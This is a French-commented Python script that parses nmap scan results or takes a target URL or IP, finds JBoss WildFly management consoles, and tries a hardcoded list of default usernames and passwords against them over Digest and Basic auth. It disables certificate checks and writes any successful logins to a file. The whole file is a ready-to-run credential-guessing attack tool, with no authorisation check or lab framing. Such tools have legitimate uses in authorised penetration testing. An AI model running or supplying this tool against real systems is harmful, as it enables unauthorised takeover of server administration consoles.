#!/usr/bin/env python3
"""
Script qui parse un fichier .nmap, identifie les services JBoss WildFly
(HAL Management Console) et teste les credentials par défaut.
Peut aussi prendre une cible directe via -i/-p ou -u.
"""

import re
import sys
import argparse
import requests
from urllib.parse import urlparse
from requests.auth import HTTPDigestAuth, HTTPBasicAuth
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Credentials par défaut connus pour JBoss/WildFly
DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", "Admin#70365"),
    ("admin", ""),
    ("jboss", "jboss"),
    ("jboss", "admin"),
    ("root", "root"),
    ("root", "admin"),
    ("wildfly", "wildfly"),
    ("administrator", "administrator"),
    ("admin", "wildfly"),
    ("manager", "manager"),
    ("admin", "jboss"),
    ("admin", "jbossas"),
    ("admin", "jbossadmin"),
    ("admin", "redhat"),
]

# Chemins typiques de la console management
MGMT_PATHS = [
    "/management",
    "/console",
    "/console/index.html",
]


def parse_nmap_file(filename):
    """
    Parse un fichier .nmap et retourne une liste de tuples (host, port, scheme)
    pour les services JBoss WildFly identifiés.
    """
    targets = []

    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    # Découpage par hôte
    host_blocks = re.split(r"Nmap scan report for ", content)

    for block in host_blocks[1:]:
        # Récupère le hostname/IP
        first_line = block.splitlines()[0]
        m = re.match(r"(?:([\w.\-]+)\s+\(([\d.]+)\)|([\d.]+|[\w.\-]+))", first_line)
        if m:
            host = m.group(2) if m.group(2) else (m.group(3) or m.group(1))
        else:
            host = first_line.strip()

        # Parcourt les lignes pour trouver les ports ouverts et les services
        lines = block.splitlines()
        current_port = None
        current_scheme = "http"
        is_jboss = False

        for i, line in enumerate(lines):
            # Détection ligne de port
            port_match = re.match(r"^(\d+)/tcp\s+open\s+(\S+)", line)
            if port_match:
                # Si on était sur un port précédent et qu'on a détecté JBoss
                if current_port and is_jboss:
                    targets.append((host, current_port, current_scheme))

                current_port = int(port_match.group(1))
                service = port_match.group(2)
                current_scheme = "https" if "ssl" in service or "https" in service else "http"
                is_jboss = False

            # Détection des marqueurs JBoss/WildFly
            if current_port:
                if "JBoss WildFly" in line or "HAL Management Console" in line:
                    is_jboss = True
                if "ssl" in line.lower() and "http" in line.lower():
                    current_scheme = "https"

        # Dernier port du bloc
        if current_port and is_jboss:
            targets.append((host, current_port, current_scheme))

    return targets


def parse_url(url):
    """
    Parse une URL de type http://host(:port) ou https://host(:port)
    et retourne un tuple (host, port, scheme).
    """
    # Ajoute un scheme par défaut si absent
    if "://" not in url:
        url = "http://" + url

    parsed = urlparse(url)
    scheme = parsed.scheme if parsed.scheme in ("http", "https") else "http"
    host = parsed.hostname

    if not host:
        raise ValueError(f"URL invalide: {url}")

    # Détermine le port
    if parsed.port:
        port = parsed.port
    else:
        port = 8443 if scheme == "https" else 8080

    return (host, port, scheme)


def test_credentials(host, port, scheme):
    """
    Teste les credentials par défaut sur l'URL de management de JBoss/WildFly.
    """
    print(f"\n[*] Test de {scheme}://{host}:{port}")
    found = []

    # Détermine le bon endpoint
    base_url = f"{scheme}://{host}:{port}"
    test_path = None

    # Essaye de trouver l'endpoint management actif
    for path in MGMT_PATHS:
        try:
            r = requests.get(base_url + path, verify=False, timeout=5, allow_redirects=False)
            if r.status_code in (401, 200, 302):
                test_path = path
                if r.status_code == 401:
                    auth_header = r.headers.get("WWW-Authenticate", "")
                    print(f"    [+] Endpoint trouvé: {path} (auth: {auth_header.split()[0] if auth_header else 'unknown'})")
                    break
        except requests.RequestException:
            continue

    if not test_path:
        print(f"    [-] Aucun endpoint management accessible trouvé")
        return found

    target_url = base_url + test_path

    for user, pwd in DEFAULT_CREDENTIALS:
        for auth_class in [HTTPDigestAuth, HTTPBasicAuth]:
            try:
                r = requests.get(
                    target_url,
                    auth=auth_class(user, pwd),
                    verify=False,
                    timeout=5,
                    allow_redirects=False,
                )
                if r.status_code in (200, 302, 303):
                    auth_type = "Digest" if auth_class == HTTPDigestAuth else "Basic"
                    print(f"    [!!!] SUCCÈS: {user}:{pwd} ({auth_type}) - HTTP {r.status_code}")
                    found.append((user, pwd, auth_type))
                    break  # Pas besoin de tester l'autre auth
            except requests.RequestException:
                pass

    if not found:
        print(f"    [-] Aucun credential par défaut valide")

    return found


def main():
    parser = argparse.ArgumentParser(
        description="Teste les credentials par défaut sur les services JBoss WildFly "
                    "(via fichier Nmap, IP/port ou URL)"
    )
    parser.add_argument("nmap_file", nargs="?", help="Fichier .nmap à analyser")
    parser.add_argument("-i", "--ip", help="Adresse IP / hostname de la cible")
    parser.add_argument("-p", "--port", type=int, help="Port de la cible (avec -i)")
    parser.add_argument("-u", "--url", help="URL de la cible: http://url(:port) ou https://url(:port)")
    parser.add_argument("-o", "--output", help="Fichier de sortie pour les credentials trouvés")
    args = parser.parse_args()

    targets = []

    # --- Mode URL ---
    if args.url:
        try:
            host, port, scheme = parse_url(args.url)
            targets.append((host, port, scheme))
            print(f"[+] Cible (URL): {scheme}://{host}:{port}")
        except ValueError as e:
            print(f"[-] {e}")
            sys.exit(1)

    # --- Mode IP/Port ---
    elif args.ip:
        port = args.port if args.port else 8080
        scheme = "https" if port in (8443, 9443, 443) else "http"
        targets.append((args.ip, port, scheme))
        print(f"[+] Cible (IP): {scheme}://{args.ip}:{port}")

    # --- Mode fichier Nmap ---
    elif args.nmap_file:
        print(f"[*] Parsing de {args.nmap_file}...")
        targets = parse_nmap_file(args.nmap_file)

        if not targets:
            print("[-] Aucun service JBoss WildFly trouvé dans le fichier nmap")
            sys.exit(0)

        print(f"[+] {len(targets)} service(s) JBoss WildFly identifié(s):")
        for host, port, scheme in targets:
            print(f"    - {scheme}://{host}:{port}")

    else:
        parser.error("Vous devez fournir un fichier .nmap, ou -i (avec -p), ou -u")

    results = []
    for host, port, scheme in targets:
        found = test_credentials(host, port, scheme)
        for user, pwd, auth_type in found:
            results.append(f"{scheme}://{host}:{port} - {user}:{pwd} ({auth_type})")

    print("\n" + "=" * 60)
    print("RÉSUMÉ")
    print("=" * 60)
    if results:
        print(f"[+] {len(results)} credential(s) par défaut trouvé(s):")
        for r in results:
            print(f"    {r}")
        if args.output:
            with open(args.output, "w") as f:
                f.write("\n".join(results) + "\n")
            print(f"\n[+] Résultats sauvegardés dans {args.output}")
    else:
        print("[-] Aucun credential par défaut n'a fonctionné")


if __name__ == "__main__":
    main()
